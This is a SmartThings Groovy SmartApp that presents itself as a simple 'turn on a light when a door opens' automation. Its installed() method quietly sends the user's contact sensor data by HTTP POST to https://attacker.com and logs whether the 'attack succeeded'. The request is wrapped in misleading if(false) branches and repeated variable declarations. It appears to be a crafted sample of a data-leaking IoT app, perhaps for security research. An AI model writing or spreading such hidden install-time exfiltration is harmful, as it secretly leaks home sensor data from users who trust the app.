
definition(
    name:"Turn It On When It Opens",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn something on when an open/close sensor opens.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet@2 x.png"
)

preferences{
    section("When the door opens..."){
        input"contact1","capability.contactSensor",title:"Where?"
        }
    section("Turn on a light..."){
        input"switches","capability.switch",multiple:true
        }
}


def installed()
{
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(false)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${contact1}"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def updated()
{
    unsubscribe()
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def contactOpenHandler(evt){
    log.debug"$evt.value:$evt,$settings"
    log.trace"Turning on switches:$switches"
    switches.on()
}


